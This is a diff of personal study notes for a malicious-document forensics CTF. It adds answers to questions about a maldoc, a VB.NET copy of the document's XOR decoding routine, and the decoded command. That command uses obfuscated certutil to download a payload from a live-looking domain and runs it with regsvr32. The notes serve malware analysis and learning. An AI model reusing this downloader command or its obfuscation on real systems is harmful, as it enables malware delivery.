@@ -17,6 +17,7 @@ Goals:
 - Read Malware Analyst's Cookbook 
 - Other Objectives
 Learnt:
+- This is not a malware analysis CTF
 - https://github.com/PaperMtn
 - Lena Rain is an awesome Composer - hackmud soundtrack hit very nicely at points
 - oletoolage
@@ -31,8 +32,8 @@ Beyond Root:
 	- https://www.youtube.com/watch?v=zzpz3VYKzUw - YARA rules reminder
 	- https://www.youtube.com/watch?v=wSkUbP9t4Dw - reversing a loader
 	- https://www.youtube.com/watch?v=TgYb3hwOAV4 - Crypters how? - Done
-	- https://www.youtube.com/watch?v=cNP6QXXUxro - Lockbit document
-	- https://www.youtube.com/watch?v=o0fvdfEmQAk - Lockbit killchain
+	- https://www.youtube.com/watch?v=cNP6QXXUxro - Lockbit document 
+	- https://www.youtube.com/watch?v=o0fvdfEmQAk - Lockbit killchain 
 	- https://www.youtube.com/playlist?list=PLt9cUwGw6CYFrFbDkpdHi43ti5dmUfoOd - anti debuging techniques - 2
 	- finalise a list for ten single play games that I would like to hack to make the game *playable*, not cheatable - to pick from in the future if I need stuff to do and relax and to keep me relaxing while these weeks and months roll on by.
 - Squeeze the 100ish pages from Art of Exploitation into using C related things I struggle to remember or use because of beginner based projects
@@ -360,32 +361,65 @@ Stomping
 Sometimes it does not matter how intimediating anything is if you can analyse it so affectively it is almost like
 
 
+What is analysis from  programmatical sense?
+What is should a tol do from an analytical sense post chatgpt3.0
 ```
 ## Attacker 3 
 
+Disconcerted at the ease of the last document. Shoulders and wings ache in the same sort of way that bouldering makes you realise you are not a lego person; also aced this with distractions and issues.
+
 Provide the executable name being downloaded.; Answer:
 ```
+olevba
+1.exe 
 ```
 QB-Forensics-Notes:
 ```
 ```
 What program is used to run the executable?; Answer:
 ```
+# Guessed, but `set u=tutil` creates the %u% variable in batch
+certutil
 ```
 QB-Forensics-Notes:
 ```
 ```
 Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).; Answer:
-```
+```vb
+' olevba
+Public Module Program
+	Public Sub Main(args() As string)
+	      Dim ju As String
+	      Dim eR() As String
+	      Dim lc As Double
+	      Dim hh As String
+	      Dim h As String
+		    ju = "12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77"
+        eR = Split(ju, "%")
+        For lc = 0 To UBound(eR)
+        hh = hh & Chr(eR(lc) Xor 111)
+        Next lc
+        h = hh
+        Console.WriteLine(h)
+	End Sub
+End Module
+
+cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ http://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
+
+' 8cfayv.com/bolb/jaent.php?l=liut6.cab
 ```
 QB-Forensics-Notes:
 ```
 ```
 What folder does the binary gets dropped in?; Answer:
 ```
+# olevba
+ProgramData
 ```
 Which stream executes the binary that was downloaded?; Answer:
 ```
+# oledump.py
+A3
 ```
 QB-Forensics-Notes:
 ```
@@ -393,6 +427,8 @@ QB-Forensics-Notes:
 
 QB-X Notes
 ```
+Tiberious is right - behold XOR 
+
 ```
 Important Takeways
 ```
@@ -495,6 +531,22 @@ Important Takeways
 Before venturing forth check the following in the Post-completion-Reflection:
 - QB-Forensics-Notes, QB-X Notes, Important Takeways:
 - [[Squid-Game-Meta-Notes]]
+
+#### Theory Crafting the good and the bad in an ugly way
+
+Previous to this point the best prevention is to never open any documents, pdf, etc
+
+- There must be a algorithm that determines the scale of human readable code as intuitively my Grandma could spot bad VBA as ultra weird nonsense 
+
+
+
+- IsItBadDoc 
+	- No internet access
+	- Automate external disconnection from internal network
+	- Change permissions to prevent accidental human reading
+	- No libreoffice, browsers, etc
+	- Docker images for all the tools
+	
 
 #### Funny Ideas
 
